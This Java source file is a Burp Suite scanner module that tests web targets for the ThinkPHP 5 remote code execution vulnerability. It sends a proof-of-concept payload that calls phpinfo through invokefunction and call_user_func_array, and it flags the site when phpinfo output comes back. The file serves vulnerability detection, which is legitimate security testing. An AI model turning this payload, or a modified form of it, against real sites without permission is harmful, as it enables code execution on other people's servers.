package burp.scan.active.poc;

import burp.IBurpExtenderCallbacks;
import burp.IHttpRequestResponse;
import burp.IScanIssue;
import burp.scan.active.ModuleBase;
import burp.scan.lib.Confidence;
import burp.scan.lib.GtScanIssue;
import burp.scan.lib.Risk;
import burp.scan.lib.utils.php.PageInfo;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.lib.web.utils.GtSession;
import burp.scan.lib.web.utils.GtURL;
import burp.scan.tags.TagTypes;
import burp.scan.tags.TagUtils;

import java.io.IOException;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;

public class ThinkPHPRCE implements ModuleBase {
    String[] PAYLOADS = {"?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1]"};

    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        String url = webInfo.getUrl();
        GtURL u = new GtURL(url);
        String baseUrl = u.getUrlWithoutQuery();
        GtSession request = new GtSession();
        for (var payload : PAYLOADS) {
            String targetUrl = baseUrl + payload;
            try {
                IHttpRequestResponse baseRequestResponse = request.burpGet(targetUrl);
                String respBody = new String(baseRequestResponse.getResponse());
                PageInfo pageInfo = new PageInfo(respBody);
                if (pageInfo.isPHPInfo()) {
                    IScanIssue issue = new GtScanIssue(
                            baseRequestResponse.getHttpService(),
                            new URL(targetUrl),
                            baseRequestResponse,
                            "ThinkPHP RCE",
                            "ThinkPHP is an extremely widely used PHP development framework in China. In its version 5, as the framework processes controller name incorrectly, it can execute any method if the website doesn't have mandatory routing enabled (which is default), resulting in a RCE vulnerability.\n" +
                                    "\n" +
                                    "Reference links：\n" +
                                    "\n" +
                                    "http://www.thinkphp.cn/topic/60400.html\n" +
                                    "http://www.thinkphp.cn/topic/60390.html\n" +
                                    "https://xz.aliyun.com/t/3570",
                            "",
                            Risk.High,
                            Confidence.Certain
                    );
                    webInfo.addIssue(issue);
                    callbacks.addScanIssue(issue);
                }
            } catch (IOException e) {
                callbacks.printError(e.getMessage());
            }
        }
    }

    @Override
    public Set<String> getTags() {
        Set<String> result = new HashSet<>();
        result.add(TagUtils.toStandardName(TagTypes.ThinkPHP_PHP));
        return result;
    }
}
